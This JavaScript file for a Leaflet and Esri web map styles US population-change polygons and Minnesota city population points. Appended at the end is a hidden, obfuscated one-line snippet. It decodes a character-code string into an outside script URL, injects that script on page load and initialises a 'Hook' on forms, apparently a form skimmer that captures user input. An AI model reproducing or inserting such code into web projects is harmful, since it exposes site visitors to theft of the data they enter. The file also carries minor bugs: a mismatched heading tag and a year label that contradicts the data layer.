// Initialize the map on the "map" div with a given center and zoom
var map = L.map("map").setView([46.37, -93.88], 6);

// Basemap Layers
L.esri.basemapLayer("DarkGray").addTo(map);
L.esri.basemapLayer("DarkGrayLabels").addTo(map);

/********************************************/
/*   Feature Layer Styling #1: Polygon    */
/* Set the color for the Population Rate  */
/*****************************************/
function getRatePopStyle(ratePop) {
	return 	ratePop >  3.0  ?  '#045A8D' :
			    ratePop >  2.0  ?  '#2B8CBE' :
			    ratePop >  1.0  ?  '#74A9CF' :
			    ratePop >  0.5  ?  '#BDC9E1' :
								             '#FFF';
}

/***************************
  Feature Layer #1: Polygon
  (ArcGIS Service)
***************************/
/* Feature Layer: U.S. Population Change between 1990-2000 (Credit: Esri, U.S. Census Bureau) */
var usPopulationChange = L.esri.featureLayer({
  url: "https://server.arcgisonline.com/arcgis/rest/services/Demographics/USA_1990-2000_Population_Change/MapServer/4",
  style: function (feature) {
      return {
        color: "#CCC",
        weight: 1.5,
        fillColor: getRatePopStyle(feature.properties.RATE_POP),
        fillOpacity: 0.75
      };
    },
  onEachFeature: function (feature, layer) {
     layer.bindPopup("<h1>" + feature.properties.NAME + "</h2>" + "<b>2000-2010 Population Change: </b>" + feature.properties.RATE_POP + "%");
   }
}).addTo(map);

/********************************************/
/*   Feature Layer Styling #2: Point       */
/*   Set the color & radius for a Point   */
/*****************************************/
function symbolizeColor(popValue) {
	return 	popValue >  100000   ?  '#045A8D' :
			    popValue >   10000   ?  '#2B8CBE' :
			    popValue >    1000   ?  '#74A9CF' :
					popValue >   		 0   ?  '#FFF':
														      '#FFF';
}

function symbolizeRadius(popValue) {
	return 	popValue >  100000  ?  15 :
			    popValue >   10000  ?  10 :
			    popValue >    1000  ?   4 :
								             		  2;
}

/***************************
  Feature Layer #2: Point
  (ArcGIS Service)
***************************/
/* Feature Layer: Minnesota City Populations (Credit: Minnesota Office of the State Auditor) */
var mnCitiesPopulations = L.esri.featureLayer({
	url: "https://www.auditor.state.mn.us/arcgis/rest/services/MnInfrastructure/MapServer/0",
  pointToLayer: function (feature, latlng) {
		return new L.CircleMarker(latlng, {
				radius: symbolizeRadius(feature.properties.Population),
				fillColor: symbolizeColor(feature.properties.Population),
				color: null,
				weight: 1,
				opacity: 1,
				fillOpacity: 0.75
		});
  },
  onEachFeature: function (feature, layer) {
     layer.bindPopup("<h1>" + feature.properties.Name + "</h1>" + "<b>Population: </b>" + feature.properties.Population);
   }
}).addTo(map);

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db